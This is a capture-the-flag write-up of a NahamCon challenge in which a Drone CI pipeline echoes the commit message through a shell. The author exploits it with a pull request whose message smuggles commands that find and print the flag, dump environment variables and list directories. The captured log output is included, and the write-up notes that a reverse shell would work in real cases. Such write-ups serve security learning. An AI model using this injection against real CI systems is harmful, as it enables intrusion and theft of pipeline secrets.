# RaaS

> Someone leaked their git credentials (developer:2!W4S5J$6e). Can you get in?
> 
> This challenge uses vhosts.
> Visit git.challenge.nahamcon.com:[YOUR_PORT]
> Visit drone.challenge.nahamcon.com:[YOUR_PORT]

Start by logging in to the Git repo. Observe the Drone CI/CD pipeline definition file `.drone.yml`:
```
---
kind: pipeline
type: exec
name: test pipeline pr-open

platform:
  os: linux
  arch: amd64

steps:
  - name: pr-open
    commands:
      - sh -c "echo $DRONE_COMMIT_MESSAGE"
trigger:
  event:
    - pull_request
  action:
    - opened
---
kind: signature
hmac: 5421480c92c78bbffdb54a029c854d87630e818631db1f8d32b388e50731dfce

...
```
The fact that the pipeline definition has a hash means we can't modify it. The Git repo also has branch protection turned on -- any PRs need to be approved by a second person. Good security controls, but...

It doesn't matter as the command step includes a command injection vulnerability. And, as we will see, simply submitting a PR that is pending approval will trigger a pipeline build. Even without the cmd exec vuln, in the real world if PR request would trigger a build we could just add some bad code to do a reverse shell, etc.

1. Fork the repo to our own, make a minor change, commit.
2. Submit PR, poison the request with below message: `message; find / -name flag.txt -exec cat {} + && env && ls -alh / && ls -alh $HOME`. Hopefully we can find the flag rightaway, but if not we have env vars and more info for follow-up attempts.
3. Switch to the Drone CI system, check build status, view logs.

Success:
```
+ sh -c "echo $DRONE_COMMIT_MESSAGE"

x3

flag{ede21e1d34dc5d783d93677c7fc254e2}

DRONE_BRANCH=master

DRONE_COMMIT_AUTHOR_AVATAR=http://git.challenge.nahamcon.com:32735/avatars/6199b84099dff1729dbc0b49895adb6c

DRONE_SYSTEM_HOST=drone.challenge.nahamcon.com:32735

GIT_COMMITTER_NAME=drone

DRONE_GIT_SSH_URL=git@localhost:JustHacking/RaaS.git

CI_BUILD_TARGET=

GIT_AUTHOR_EMAIL=developer@noreply.localhost
<SNIP>
```

Fun challenge, again thanks congon4tor
